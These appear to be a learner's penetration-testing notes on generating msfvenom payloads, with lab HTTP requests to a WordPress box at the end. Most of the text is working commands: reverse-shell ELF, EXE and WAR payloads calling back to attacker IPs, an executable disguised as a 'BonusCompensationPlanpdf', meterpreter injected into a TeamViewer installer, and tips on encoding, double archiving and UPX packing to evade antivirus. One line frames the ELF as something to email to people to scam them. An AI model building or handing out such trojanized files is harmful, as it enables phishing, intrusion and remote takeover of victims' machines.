Creating payload 
similar to [[metasploit]]


List all available payloads 
```
msfvenom -l payloads
```

Staged VS Stageless 
Staged
Create way for us to send over more components of our attack 
Stageless 
Do not have a stage 


How to identify them? 
by name 
linux/x86/shell/reverse_tcp - stage payload - says /shell/ - a stage to send and then /reverse_tcp another stage 

linx/zarch/meterpreter_reverse_tcp - stageless - all the stages are all compressed into one name 

Creating a stageless payload
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
this will create an elf file called createbackup.elf that we can use to send ppl in email and scam them 

# Windows payload 
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```


# Changing it to a different format name 
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f war -o shell.war
```

Injecting it into real executable files
```shell-session
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

To hide information we can archive it twice (encrypt it with a password), it will no longer be flagged out as virus but it will be flagged out as the files is unable to be read

```shell-session
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
```

We can also use packers like upx 

Request that i sent

```
POST /wp-comments-post.php HTTP/1.1
Host: apocalyst.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 128
Origin: http://apocalyst.htb
Connection: keep-alive
Referer: http://apocalyst.htb/?p=5
Cookie: comment_author_fe82fc3c604d57765e9ee2edc912ea2d=banana; comment_author_email_fe82fc3c604d57765e9ee2edc912ea2d=banan%40banan.com; comment_author_url_fe82fc3c604d57765e9ee2edc912ea2d=http%3A%2F%2Fblah; wordpress_test_cookie=WP+Cookie+check
Upgrade-Insecure-Requests: 1
Priority: u=0, i

comment=hello&author=banana&email=banan%40banan.com&url=http%3A%2F%2Fblah&submit=Post+Comment&comment_post_ID=5&comment_parent=0
```

What we receive back 
```
GET /?p=5 HTTP/1.1
Host: apocalyst.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://apocalyst.htb/?p=5
Connection: keep-alive
Cookie: comment_author_fe82fc3c604d57765e9ee2edc912ea2d=banana; comment_author_email_fe82fc3c604d57765e9ee2edc912ea2d=banan%40banan.com; comment_author_url_fe82fc3c604d57765e9ee2edc912ea2d=http%3A%2F%2Fblah; wordpress_test_cookie=WP+Cookie+check
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```